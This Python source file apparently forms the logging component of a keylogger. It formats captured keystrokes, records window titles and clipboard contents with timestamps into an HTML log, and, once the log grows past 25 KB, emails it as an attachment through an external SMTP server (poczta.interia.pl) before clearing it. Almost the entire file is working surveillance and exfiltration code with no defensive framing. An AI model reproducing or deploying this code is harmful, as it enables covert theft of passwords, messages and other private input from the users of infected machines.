from pathlib import Path
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import datetime


class Skeleton:

    def __init__(self):

        self.filename = "file.html"

    def fonts(self, key, *font_name):
        font_names = ['b', 'i', 'u']
        for font in font_name:
            if font in font_names:
                key = str(key)
                key = "<"+str(font)+">"+key+"</"+str(font)+">"
            else:
                key = str(key)
        return key

    def format(self, key):
        if "'" in key:
            key = key[1:-1]

        if key == "Key.space":
            key = " "
        if key == "Key.backspace":
            key = "[<]"
        if "Key" in key:
            key = ""
            #key = key

        return key

    def write_to_file(self, string):
        string_with_date = string
        with open(self.filename, "a") as f:
            f.write(string_with_date)

    def write_process_name(self, window_name):
        window_name = str(window_name)
        window_name = "[<font color='green'><b>"+window_name+"</b></font>]<br />"
        with open(self.filename, "a") as f:
            f.write(window_name)

    def check_file_size(self):
        file_size = Path(self.filename).stat().st_size
        if file_size > 25000:
            self.send_email()
            with open(self.filename, "w") as f:
                f.write("")

    def send_email(self):
        try:
            fromaddr = "my-email"
            toaddr = "my-email"
            msg = MIMEMultipart()
            msg['From'] = fromaddr
            msg['To'] = toaddr
            msg['Subject'] = "Nowa wiadomosc :)"
            body = "Tekst wiadomosci"
            msg.attach(MIMEText(body, 'plain'))
            filename = self.filename
            attachment = open(self.filename, "rb")
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
            msg.attach(p)
            s = smtplib.SMTP('poczta.interia.pl', 587)
            s.starttls()
            s.login(fromaddr, "password")
            text = msg.as_string()
            s.sendmail(fromaddr, toaddr, text)
            s.quit()
        except Exception as e:
            print(e)

    def add_string_to_file(self, string):
        time_now = str(datetime.datetime.now().strftime("%H:%M:%S %d.%m.%Y"))
        time_start_font = "<u><b><font color='black'>["
        time_end_font = "]</b></u></font> "
        time_now = time_start_font + time_now + time_end_font

        string_start_font = "<b><font color='blue'>"
        string_end_font = "</b></font> "
        string = string_start_font + string + string_end_font

        end = "<br />"
        string = Skeleton().fonts(string, "b")
        string = time_now + string + end
        self.write_to_file(string)

    def add_clipboard_to_file(self, string):
        time_now = str(datetime.datetime.now().strftime("%H:%M:%S %d.%m.%Y"))
        time_start_font = "<u><b><font color='black'>["
        time_end_font = "]</font><font color=""></u>{CLIPBOARD}</font></b> "
        time_now = time_start_font + time_now + time_end_font

        string_start_font = "<b><font color='#cc0000'>"
        string_end_font = "</b></font> "
        string = string_start_font + string + string_end_font

        end = "<br />"
        string = Skeleton().fonts(string, "b")
        string = time_now + string + end

        self.write_to_file(string)
